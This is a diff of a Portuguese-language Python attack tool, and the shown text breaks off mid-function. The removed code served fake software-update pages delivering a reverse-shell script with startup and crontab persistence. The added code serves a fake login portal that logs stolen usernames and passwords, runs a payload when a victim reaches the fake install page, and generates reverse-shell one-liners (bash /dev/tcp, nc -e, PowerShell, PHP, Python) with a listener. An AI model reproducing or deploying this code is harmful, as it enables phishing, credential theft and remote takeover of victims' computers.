@@ -1,602 +1,915 @@
-#!/usr/bin/env python3
+#!/data/data/com.termux/files/usr/bin/python3
 # -*- coding: utf-8 -*-
 
 import os
 import sys
+import time
+import random
 import socket
 import threading
-import http.server
-import socketserver
-import random
-import time
-from urllib.parse import urlparse, parse_qs
-from datetime import datetime
+import subprocess
+import base64
+import hashlib
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import urlparse, parse_qs, quote
+from typing import Dict, List, Optional
 
-# Configurações
-PORT = 8080
-HOST = "0.0.0.0"
-DOWNLOAD_FILE = "update_setup.exe"
-SHELL_SCRIPT = "shell_reverse.py"
+# Interface colorida no terminal
+from rich.console import Console
+from rich.panel import Panel
+from rich.table import Table
+from rich.prompt import Prompt, Confirm, IntPrompt
+from rich.progress import Progress
+from rich.text import Text
+from rich.syntax import Syntax
+from rich.layout import Layout
+from rich.live import Live
+from rich.align import Align
 
-# Cores para output
-class Colors:
-    RED = '\033[91m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    BLUE = '\033[94m'
-    PURPLE = '\033[95m'
-    CYAN = '\033[96m'
-    WHITE = '\033[97m'
-    RESET = '\033[0m'
-    BOLD = '\033[1m'
+console = Console()
 
-# Template HTML da página de download
-HTML_TEMPLATE = """
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{page_title}</title>
-    <style>
-        * {{
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Arial, sans-serif;
-        }}
-        
-        body {{
-            background: linear-gradient(135deg, {bg_gradient});
-            color: #333;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }}
-        
-        .container {{
-            background: #fff;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            overflow: hidden;
-            max-width: 800px;
-            width: 100%;
-        }}
-        
-        .header {{
-            background: {header_bg};
-            color: white;
-            padding: 30px;
-            text-align: center;
-        }}
-        
-        .header h1 {{
-            font-size: 28px;
-            margin-bottom: 10px;
-        }}
-        
-        .header p {{
-            opacity: 0.9;
-            font-size: 16px;
-        }}
-        
-        .content {{
-            padding: 40px;
-        }}
-        
-        .update-info {{
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 25px;
-            border-left: 4px solid {accent_color};
-        }}
-        
-        .update-info h3 {{
-            color: {accent_color};
-            margin-bottom: 15px;
-        }}
-        
-        .features {{
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            margin-bottom: 25px;
-        }}
-        
-        .feature {{
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }}
-        
-        .feature i {{
-            color: {accent_color};
-            font-size: 18px;
-        }}
-        
-        .download-section {{
-            text-align: center;
-            margin: 30px 0;
-        }}
-        
-        .download-btn {{
-            display: inline-block;
-            background: {accent_color};
-            color: white;
-            padding: 16px 40px;
-            border-radius: 8px;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 18px;
-            transition: all 0.3s;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-        }}
-        
-        .download-btn:hover {{
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
-            background: {accent_hover};
-        }}
-        
-        .security-badge {{
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 20px;
-            color: #28a745;
-            font-weight: 600;
-        }}
-        
-        .stats {{
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 15px;
-            margin: 30px 0;
-        }}
-        
-        .stat {{
-            text-align: center;
-            padding: 15px;
-            background: #f8f9fa;
-            border-radius: 8px;
-        }}
-        
-        .stat-number {{
-            font-size: 24px;
-            font-weight: bold;
-            color: {accent_color};
-        }}
-        
-        .footer {{
-            background: #f8f9fa;
-            padding: 20px;
-            text-align: center;
-            font-size: 14px;
-            color: #666;
-        }}
-        
-        .verified {{
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 10px;
-            color: #17a2b8;
-        }}
-        
-        @media (max-width: 768px) {{
-            .features {{
-                grid-template-columns: 1fr;
-            }}
-            
-            .stats {{
-                grid-template-columns: 1fr;
-            }}
-        }}
-    </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>{header_title}</h1>
-            <p>{header_subtitle}</p>
-        </div>
-        
-        <div class="content">
-            <div class="update-info">
-                <h3><i class="fas fa-info-circle"></i> Informações da Atualização</h3>
-                <p>{update_description}</p>
-            </div>
-            
-            <h3>Novas Funcionalidades:</h3>
-            <div class="features">
-                <div class="feature">
-                    <i class="fas fa-shield-alt"></i>
-                    <span>Melhorias de segurança</span>
-                </div>
-                <div class="feature">
-                    <i class="fas fa-bolt"></i>
-                    <span>Desempenho otimizado</span>
-                </div>
-                <div class="feature">
-                    <i class="fas fa-bug"></i>
-                    <span>Correção de bugs</span>
-                </div>
-                <div class="feature">
-                    <i class="fas fa-plus"></i>
-                    <span>Novos recursos</span>
-                </div>
-            </div>
-            
-            <div class="stats">
-                <div class="stat">
-                    <div class="stat-number">+2M</div>
-                    <div>Downloads</div>
-                </div>
-                <div class="stat">
-                    <div class="stat-number">99.8%</div>
-                    <div>Taxa de sucesso</div>
-                </div>
-                <div class="stat">
-                    <div class="stat-number">4.9★</div>
-                    <div>Avaliação</div>
-                </div>
-            </div>
-            
-            <div class="download-section">
-                <a href="/download" class="download-btn">
-                    <i class="fas fa-download"></i> Baixar Agora
-                </a>
-                <div class="security-badge">
-                    <i class="fas fa-check-circle"></i>
-                    Verificado e seguro • {file_size}
-                </div>
-            </div>
-            
-            <div class="verified">
-                <i class="fas fa-shield-check"></i>
-                Este arquivo foi verificado por nosso sistema de segurança
-            </div>
-        </div>
-        
-        <div class="footer">
-            <p>{footer_text}</p>
-            <p>{current_year} {company_name} • Todos os direitos reservados</p>
-        </div>
-    </div>
-</body>
-</html>
-"""
-
-# Templates de páginas diferentes
-PAGE_TEMPLATES = {
-    "update": {
-        "page_title": "Atualização Disponível - {software_name}",
-        "header_title": "Nova Atualização Disponível",
-        "header_subtitle": "Melhorias de desempenho e segurança",
-        "header_bg": "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
-        "bg_gradient": "#667eea, #764ba2",
-        "accent_color": "#667eea",
-        "accent_hover": "#5a6fd8",
-        "update_description": "Esta atualização crítica inclui importantes correções de segurança e melhorias de desempenho. Recomendamos instalar imediatamente.",
-        "file_size": "15.2 MB",
-        "footer_text": "Mantenha seu software sempre atualizado para garantir a melhor experiência e segurança.",
-        "company_name": "TechSoft Solutions",
-        "software_name": "Software Essential"
-    },
-    "driver": {
-        "page_title": "Driver de Dispositivo - Atualização Necessária",
-        "header_title": "Driver Atualizado Disponível",
-        "header_subtitle": "Melhor compatibilidade e desempenho",
-        "header_bg": "linear-gradient(135deg, #11998e 0%, #38ef7d 100%)",
-        "bg_gradient": "#11998e, #38ef7d",
-        "accent_color": "#11998e",
-        "accent_hover": "#0e7f74",
-        "update_description": "Seu dispositivo requer esta atualização de driver para funcionar corretamente e evitar problemas de compatibilidade.",
-        "file_size": "8.7 MB",
-        "footer_text": "Drivers atualizados garantem o melhor desempenho do seu hardware.",
-        "company_name": "DeviceMaster Inc.",
-        "software_name": "Driver Universal"
-    },
-    "plugin": {
-        "page_title": "Plugin Necessário - {software_name}",
-        "header_title": "Plugin Requerido para Conteúdo",
-        "header_subtitle": "Instale para visualizar este conteúdo",
-        "header_bg": "linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%)",
-        "bg_gradient": "#ff6b6b, #ee5a52",
-        "accent_color": "#ff6b6b",
-        "accent_hover": "#e55a5a",
-        "update_description": "Este plugin é necessário para visualizar o conteúdo corretamente. Instale-o para continuar.",
-        "file_size": "3.5 MB",
-        "footer_text": "Plugins adicionam funcionalidades essenciais ao seu software.",
-        "company_name": "WebMedia Technologies",
-        "software_name": "MediaView Plugin"
-    },
-    "codec": {
-        "page_title": "Pacote de Codecs de Mídia",
-        "header_title": "Codecs de Mídia Necessários",
-        "header_subtitle": "Reproduza qualquer formato de mídia",
-        "header_bg": "linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)",
-        "bg_gradient": "#4facfe, #00f2fe",
-        "accent_color": "#4facfe",
-        "accent_hover": "#3d9be3",
-        "update_description": "Este pacote de codecs permite reproduzir todos os formatos de áudio e vídeo populares.",
-        "file_size": "12.8 MB",
-        "footer_text": "Suporte completo a formatos de mídia com um único instalador.",
-        "company_name": "MediaExperience Labs",
-        "software_name": "Universal Codec Pack"
-    }
-}
-
-class MaliciousHandler(http.server.SimpleHTTPRequestHandler):
+class FakeSiteHandler(BaseHTTPRequestHandler):
+    def __init__(self, *args, **kwargs):
+        self.payloads = kwargs.pop('payloads', {})
+        super().__init__(*args, **kwargs)
+    
     def do_GET(self):
-        # Log da requisição
-        self.log_request()
+        client_ip = self.client_address[0]
+        console.print(f"[yellow]📥 GET de {client_ip}: {self.path}[/yellow]")
         
-        # Página de download do arquivo malicioso
-        if self.path == "/download":
-            self.serve_malicious_file()
-            return
-            
-        # Página principal
-        if self.path == "/" or self.path == "/index.html":
-            self.serve_main_page()
-            return
-            
-        # Servir arquivos estáticos se existirem
-        if self.path.endswith(('.css', '.js', '.png', '.jpg', '.ico')):
-            super().do_GET()
-            return
-            
-        # Página não encontrada
-        self.send_error(404, "Página não encontrada")
+        # Páginas diferentes para diferentes caminhos
+        if self.path == '/':
+            self.serve_login_page()
+        elif self.path == '/update':
+            self.serve_update_page()
+        elif self.path == '/login':
+            self.serve_login_page()
+        elif self.path == '/dashboard':
+            self.serve_dashboard()
+        elif self.path == '/download':
+            self.serve_download_page()
+        elif self.path == '/install':
+            self.serve_install_page()
+        elif self.path == '/payload':
+            self.serve_payload()
+        elif self.path == '/shell':
+            self.serve_shell()
+        else:
+            self.serve_404()
+    
+    def do_POST(self):
+        client_ip = self.client_address[0]
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode('utf-8')
         
-    def serve_main_page(self):
-        # Selecionar template aleatório
-        template_key = random.choice(list(PAGE_TEMPLATES.keys()))
-        template = PAGE_TEMPLATES[template_key]
-        current_year = datetime.now().year
+        console.print(f"[yellow]📨 POST de {client_ip}: {self.path}[/yellow]")
         
-        # Gerar HTML personalizado
-        html_content = HTML_TEMPLATE.format(
-            page_title=template["page_title"].format(software_name=template["software_name"]),
-            header_title=template["header_title"],
-            header_subtitle=template["header_subtitle"],
-            header_bg=template["header_bg"],
-            bg_gradient=template["bg_gradient"],
-            accent_color=template["accent_color"],
-            accent_hover=template["accent_hover"],
-            update_description=template["update_description"],
-            file_size=template["file_size"],
-            footer_text=template["footer_text"],
-            current_year=current_year,
-            company_name=template["company_name"]
-        )
-        
+        if self.path == '/login':
+            self.process_login(post_data)
+        elif self.path == '/download':
+            self.process_download(post_data)
+        else:
+            self.send_response(404)
+            self.end_headers()
+    
+    def serve_login_page(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
-        self.wfile.write(html_content.encode('utf-8'))
         
-    def serve_malicious_file(self):
-        try:
-            # Verificar se o arquivo existe
-            if not os.path.exists(DOWNLOAD_FILE):
-                self.generate_malicious_file()
-                
-            # Servir o arquivo
-            self.send_response(200)
-            self.send_header('Content-type', 'application/octet-stream')
-            self.send_header('Content-Disposition', f'attachment; filename="{DOWNLOAD_FILE}"')
-            self.send_header('Content-Length', os.path.getsize(DOWNLOAD_FILE))
-            self.end_headers()
-            
-            with open(DOWNLOAD_FILE, 'rb') as f:
-                self.wfile.write(f.read())
-                
-            # Log de download
-            ip_address = self.client_address[0]
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            print(f"{Colors.GREEN}[+] {Colors.RESET}Download realizado - IP: {ip_address} - {timestamp}")
-            
-        except Exception as e:
-            self.send_error(500, f"Erro ao servir arquivo: {str(e)}")
+        html_content = """
+        <!DOCTYPE html>
+        <html lang="pt-BR">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Sistema de Autenticação - Portal Seguro</title>
+            <style>
+                body { 
+                    font-family: Arial, sans-serif; 
+                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                    height: 100vh;
+                    margin: 0;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                }
+                .login-container {
+                    background: white;
+                    padding: 30px;
+                    border-radius: 10px;
+                    box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+                    width: 350px;
+                }
+                .logo {
+                    text-align: center;
+                    margin-bottom: 20px;
+                }
+                .logo h1 {
+                    color: #333;
+                    margin: 0;
+                }
+                .logo span {
+                    color: #667eea;
+                    font-size: 12px;
+                }
+                input[type="text"], input[type="password"] {
+                    width: 100%;
+                    padding: 12px;
+                    margin: 8px 0;
+                    border: 1px solid #ddd;
+                    border-radius: 4px;
+                    box-sizing: border-box;
+                }
+                button {
+                    background-color: #667eea;
+                    color: white;
+                    padding: 12px 20px;
+                    border: none;
+                    border-radius: 4px;
+                    cursor: pointer;
+                    width: 100%;
+                    font-size: 16px;
+                }
+                button:hover {
+                    background-color: #5a67d8;
+                }
+                .footer {
+                    text-align: center;
+                    margin-top: 20px;
+                    font-size: 12px;
+                    color: #666;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="login-container">
+                <div class="logo">
+                    <h1>🔒 SecurePortal</h1>
+                    <span>Sistema de Autenticação Segura</span>
+                </div>
+                <form action="/login" method="POST">
+                    <input type="text" name="username" placeholder="Usuário" required>
+                    <input type="password" name="password" placeholder="Senha" required>
+                    <button type="submit">Acessar Sistema</button>
+                </form>
+                <div class="footer">
+                    © 2024 SecureSystems - Todos os direitos reservados
+                </div>
+            </div>
+        </body>
+        </html>
+        """
+        self.wfile.write(html_content.encode())
     
-    def generate_malicious_file(self):
-        """Gera o arquivo malicioso com shell reverso"""
-        # Primeiro, criar o script Python do shell reverso
-        shell_code = f'''#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
-import os
-import sys
-import socket
-import subprocess
-import threading
-import time
-import requests
-
-# Configurações do shell reverso
-LHOST = "{self.get_local_ip()}"  # IP do atacante
-LPORT = 4444                     # Porta do atacante
-
-def reverse_shell():
-    """Estabelece conexão reversa"""
-    try:
-        # Criar socket
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((LHOST, LPORT))
+    def serve_update_page(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
         
-        # Redirecionar stdin, stdout, stderr
-        os.dup2(s.fileno(), 0)
-        os.dup2(s.fileno(), 1)
-        os.dup2(s.fileno(), 2)
+        html_content = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Atualização de Sistema</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 40px; }
+                .update-box { border: 1px solid #ccc; padding: 20px; border-radius: 5px; }
+                .btn { background: #007bff; color: white; padding: 10px 15px; border: none; border-radius: 3px; cursor: pointer; }
+            </style>
+        </head>
+        <body>
+            <div class="update-box">
+                <h2>📦 Atualização Disponível</h2>
+                <p>Uma nova atualização de segurança está disponível para seu sistema.</p>
+                <p><strong>Versão 2.3.4</strong> - Correções críticas de segurança</p>
+                <button class="btn" onclick="installUpdate()">Instalar Atualização</button>
+            </div>
+            <script>
+                function installUpdate() {
+                    document.body.innerHTML = '<h2>⏳ Instalando atualização...</h2><p>Por favor, aguarde. Não feche esta página.</p>';
+                    setTimeout(() => { 
+                        window.location.href = '/install'; 
+                    }, 2000);
+                }
+            </script>
+        </body>
+        </html>
+        """
+        self.wfile.write(html_content.encode())
+    
+    def serve_dashboard(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
         
-        # Executar shell
-        subprocess.call(["/bin/bash", "-i"] if os.name != "nt" else ["cmd.exe"])
-        
-    except Exception as e:
-        # Tentar reconectar após falha
-        time.sleep(60)
-        reverse_shell()
-
-def persistencia():
-    """Adiciona persistência ao sistema"""
-    try:
-        if os.name == "nt":  # Windows
-            # Adicionar à inicialização do Windows
-            startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-            bat_path = os.path.join(startup_dir, "system_update.bat")
+        html_content = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Dashboard - Sistema Seguro</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 40px; }
+                .header { background: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
+                .card { border: 1px solid #ddd; padding: 15px; border-radius: 5px; margin-bottom: 15px; }
+            </style>
+        </head>
+        <body>
+            <div class="header">
+                <h1>🏠 Dashboard do Sistema</h1>
+                <p>Bem-vindo ao painel de controle seguro</p>
+            </div>
             
-            with open(bat_path, "w") as f:
-                f.write(f"@echo off\\n")
-                f.write(f"start /B pythonw \\"{os.path.abspath(__file__)}\\"\\n")
+            <div class="card">
+                <h3>📊 Estatísticas do Sistema</h3>
+                <p>Status: <span style="color:green">●</span> Online</p>
+                <p>Usuários ativos: 12</p>
+            </div>
+            
+            <div class="card">
+                <h3>🔔 Notificações</h3>
+                <p>Verifique as atualizações de segurança em <a href="/update">/update</a></p>
+            </div>
+        </body>
+        </html>
+        """
+        self.wfile.write(html_content.encode())
+    
+    def serve_download_page(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        
+        html_content = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Download - Software Oficial</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 40px; }
+                .download-box { border: 1px solid #ccc; padding: 20px; border-radius: 5px; }
+                .btn { background: #28a745; color: white; padding: 10px 15px; border: none; border-radius: 3px; cursor: pointer; margin: 5px; }
+            </style>
+        </head>
+        <body>
+            <div class="download-box">
+                <h2>⬇️ Download do Software</h2>
+                <p>Selecione a versão para download:</p>
                 
-        else:  # Linux/Mac
-            # Adicionar ao crontab
-            cron_cmd = f"@reboot python3 {os.path.abspath(__file__)} >/dev/null 2>&1 &"
-            os.system(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -')
-            
-    except:
-        pass
-
-def coletar_informacoes():
-    """Coleta informações do sistema"""
-    info = {{
-        "sistema": os.name,
-        "hostname": socket.gethostname(),
-        "usuario": os.getenv("USERNAME") or os.getenv("USER"),
-        "diretorio": os.getcwd()
-    }}
-    
-    try:
-        # Tentar enviar informações para servidor
-        requests.post(f"http://{LHOST}:8000/info", json=info, timeout=5)
-    except:
-        pass
-
-if __name__ == "__main__":
-    # Coletar informações do sistema
-    coletar_informacoes()
-    
-    # Adicionar persistência
-    persistencia()
-    
-    # Iniciar shell reverso
-    while True:
-        try:
-            reverse_shell()
-        except:
-            time.sleep(30)  # Esperar antes de tentar reconectar
-'''
-
-        # Salvar script do shell reverso
-        with open(SHELL_SCRIPT, "w", encoding="utf-8") as f:
-            f.write(shell_code)
-            
-        # Criar arquivo batch para Windows (que executa o script Python)
-        batch_content = f'''@echo off
-echo Instalando atualizacao...
-timeout /t 3 /nobreak >nul
-pythonw "{SHELL_SCRIPT}"
-echo Atualizacao concluida com sucesso!
-pause
-'''
-        
-        # Salvar arquivo batch
-        with open(DOWNLOAD_FILE, "w", encoding="utf-8") as f:
-            f.write(batch_content)
-            
-        print(f"{Colors.GREEN}[+] {Colors.RESET}Arquivo malicioso gerado: {DOWNLOAD_FILE}")
-        
-    def get_local_ip(self):
-        """Obtém o IP local da máquina"""
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            ip = s.getsockname()[0]
-            s.close()
-            return ip
-        except:
-            return "127.0.0.1"
-        
-    def log_message(self, format, *args):
-        # Personalizar logs
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        message = format % args
-        
-        # Exibir log colorido no console
-        if "200" in message:
-            color = Colors.GREEN
-        elif "404" in message:
-            color = Colors.RED
-        else:
-            color = Colors.YELLOW
-            
-        print(f"{color}[{timestamp}] {message}{Colors.RESET}")
-
-class DownloadServer:
-    def __init__(self):
-        self.host = HOST
-        self.port = PORT
-        self.httpd = None
-        
-    def start_server(self):
-        try:
-            with socketserver.TCPServer((self.host, self.port), MaliciousHandler) as httpd:
-                self.httpd = httpd
-                print(f"{Colors.GREEN}[+] {Colors.RESET}Servidor iniciado em http://{self.host}:{self.port}")
-                print(f"{Colors.GREEN}[+] {Colors.RESET}Página de download: http://{self.host}:{self.port}/download")
-                print(f"{Colors.YELLOW}[!] {Colors.RESET}Configure o listener na porta 4444 para receber conexões")
-                print(f"{Colors.YELLOW}[!] {Colors.RESET}Pressione Ctrl+C para parar o servidor")
-                
-                try:
-                    httpd.serve_forever()
-                except KeyboardInterrupt:
-                    print(f"\n{Colors.RED}[-] {Colors.RESET}Parando servidor...")
+                <form action="/download" method="POST">
+                    <input type="radio" id="win" name="os" value="windows" checked>
+                    <label for="win">Windows</label><br>
                     
-        except Exception as e:
-            print(f"{Colors.RED}[-] {Colors.RESET}Erro ao iniciar servidor: {e}")
+                    <input type="radio" id="mac" name="os" value="macos">
+                    <label for="mac">macOS</label><br>
+                    
+                    <input type="radio" id="linux" name="os" value="linux">
+                    <label for="linux">Linux</label><br><br>
+                    
+                    <button type="submit" class="btn">Iniciar Download</button>
+                </form>
+            </div>
+        </body>
+        </html>
+        """
+        self.wfile.write(html_content.encode())
+    
+    def serve_install_page(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        
+        html_content = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Instalação em Andamento</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 40px; text-align: center; }
+                .progress { 
+                    height: 20px; 
+                    background-color: #f5f5f5; 
+                    border-radius: 4px; 
+                    margin: 20px 0; 
+                    overflow: hidden;
+                }
+                .progress-bar {
+                    height: 100%;
+                    background-color: #007bff;
+                    width: 0%;
+                    transition: width 0.5s;
+                }
+            </style>
+        </head>
+        <body>
+            <h2>⏳ Instalando Atualização de Segurança</h2>
+            <p>Por favor, aguarde. Não feche esta página.</p>
             
-    def get_public_ip(self):
+            <div class="progress">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            
+            <p id="status">Inicializando...</p>
+            
+            <script>
+                var progress = 0;
+                var interval = setInterval(function() {
+                    progress += 5;
+                    document.getElementById('progressBar').style.width = progress + '%';
+                    
+                    if (progress < 30) {
+                        document.getElementById('status').innerText = 'Baixando pacotes...';
+                    } else if (progress < 60) {
+                        document.getElementById('status').innerText = 'Verificando integridade...';
+                    } else if (progress < 90) {
+                        document.getElementById('status').innerText = 'Aplicando atualização...';
+                    } else {
+                        document.getElementById('status').innerText = 'Finalizando...';
+                    }
+                    
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        setTimeout(function() {
+                            window.location.href = '/payload';
+                        }, 1000);
+                    }
+                }, 200);
+            </script>
+        </body>
+        </html>
+        """
+        self.wfile.write(html_content.encode())
+    
+    def serve_payload(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        
+        # Executar payload em segundo plano
         try:
-            import requests
-            response = requests.get('https://api.ipify.org', timeout=5)
-            return response.text
+            if 'payload' in self.payloads:
+                payload = self.payloads['payload']
+                # Executar o payload em uma thread separada
+                threading.Thread(target=self.execute_payload, args=(payload,)).start()
+        except Exception as e:
+            console.print(f"[red]❌ Erro ao executar payload: {e}[/red]")
+        
+        html_content = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Instalação Concluída</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 40px; text-align: center; }
+                .success { color: #28a745; font-size: 24px; }
+            </style>
+        </head>
+        <body>
+            <div class="success">
+                <h2>✅ Instalação Concluída com Sucesso!</h2>
+                <p>Seu sistema está agora atualizado e seguro.</p>
+                <p>Você pode fechar esta janela.</p>
+            </div>
+        </body>
+        </html>
+        """
+        self.wfile.write(html_content.encode())
+    
+    def serve_shell(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        
+        html_content = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Terminal Web</title>
+            <style>
+                body { font-family: monospace; margin: 20px; background: #000; color: #0f0; }
+                #terminal { width: 100%; height: 80vh; overflow: auto; }
+                .input-line { display: flex; }
+                .prompt { color: #0f0; margin-right: 5px; }
+                input { background: transparent; border: none; color: #0f0; outline: none; font-family: monospace; width: 80%; }
+            </style>
+        </head>
+        <body>
+            <div id="terminal"></div>
+            <div class="input-line">
+                <span class="prompt">$</span>
+                <input type="text" id="command" autofocus>
+            </div>
+            
+            <script>
+                const terminal = document.getElementById('terminal');
+                const commandInput = document.getElementById('command');
+                
+                function addOutput(text) {
+                    const line = document.createElement('div');
+                    line.textContent = text;
+                    terminal.appendChild(line);
+                    terminal.scrollTop = terminal.scrollHeight;
+                }
+                
+                commandInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        const command = commandInput.value;
+                        addOutput('$ ' + command);
+                        commandInput.value = '';
+                        
+                        // Enviar comando para o servidor
+                        fetch('/execute', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ command: command })
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.output) {
+                                addOutput(data.output);
+                            }
+                        })
+                        .catch(error => {
+                            addOutput('Erro: ' + error);
+                        });
+                    }
+                });
+                
+                addOutput('Terminal Web inicializado. Digite um comando:');
+            </script>
+        </body>
+        </html>
+        """
+        self.wfile.write(html_content.encode())
+    
+    def serve_404(self):
+        self.send_response(404)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(b'<h1>404 - Pagina nao encontrada</h1>')
+    
+    def process_login(self, post_data):
+        parsed_data = parse_qs(post_data)
+        username = parsed_data.get('username', [''])[0]
+        password = parsed_data.get('password', [''])[0]
+        
+        console.print(f"[red]🔓 Tentativa de login: {username}:{password}[/red]")
+        
+        # Redirecionar para dashboard
+        self.send_response(302)
+        self.send_header('Location', '/dashboard')
+        self.end_headers()
+    
+    def process_download(self, post_data):
+        parsed_data = parse_qs(post_data)
+        os_type = parsed_data.get('os', ['windows'])[0]
+        
+        console.print(f"[yellow]📥 Download solicitado para: {os_type}[/yellow]")
+        
+        # Redirecionar para instalação
+        self.send_response(302)
+        self.send_header('Location', '/install')
+        self.end_headers()
+    
+    def execute_payload(self, payload):
+        try:
+            console.print(f"[green]🚀 Executando payload...[/green]")
+            if payload.startswith("python"):
+                subprocess.run(payload.split(), capture_output=True, timeout=10)
+            else:
+                subprocess.run(payload, shell=True, capture_output=True, timeout=10)
+            console.print(f"[green]✅ Payload executado com sucesso[/green]")
+        except Exception as e:
+            console.print(f"[red]❌ Erro ao executar payload: {e}[/red]")
+
+class ReverseShellManager:
+    def __init__(self):
+        self.active_shells = {}
+        self.shell_types = {
+            'python': self.generate_python_shell,
+            'bash': self.generate_bash_shell,
+            'powershell': self.generate_powershell_shell,
+            'php': self.generate_php_shell,
+            'netcat': self.generate_netcat_shell
+        }
+    
+    def generate_python_shell(self, ip: str, port: int) -> str:
+        return f"""python3 -c \"import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i'])\""""
+    
+    def generate_bash_shell(self, ip: str, port: int) -> str:
+        return f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
+    
+    def generate_powershell_shell(self, ip: str, port: int) -> str:
+        return f"""powershell -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """
+    
+    def generate_php_shell(self, ip: str, port: int) -> str:
+        return f"php -r \"$sock=fsockopen('{ip}',{port});exec('/bin/sh -i <&3 >&3 2>&3');\""
+    
+    def generate_netcat_shell(self, ip: str, port: int) -> str:
+        return f"nc -e /bin/sh {ip} {port}"
+    
+    def start_listener(self, port: int):
+        """Inicia um listener na porta especificada"""
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.bind(('0.0.0.0', port))
+                s.listen(1)
+                console.print(f"[green]👂 Ouvindo na porta {port}...[/green]")
+                conn, addr = s.accept()
+                console.print(f"[green]✅ Conexão recebida de {addr}[/green]")
+                
+                with conn:
+                    conn.sendall(b"Shell reverso conectado com sucesso!\n")
+                    while True:
+                        try:
+                            data = conn.recv(1024)
+                            if not data:
+                                break
+                            console.print(f"[cyan]📨 Dados: {data.decode()}[/cyan]")
+                            
+                            # Executar comando se começar com "cmd:"
+                            if data.decode().startswith("cmd:"):
+                                command = data.decode()[4:].strip()
+                                try:
+                                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
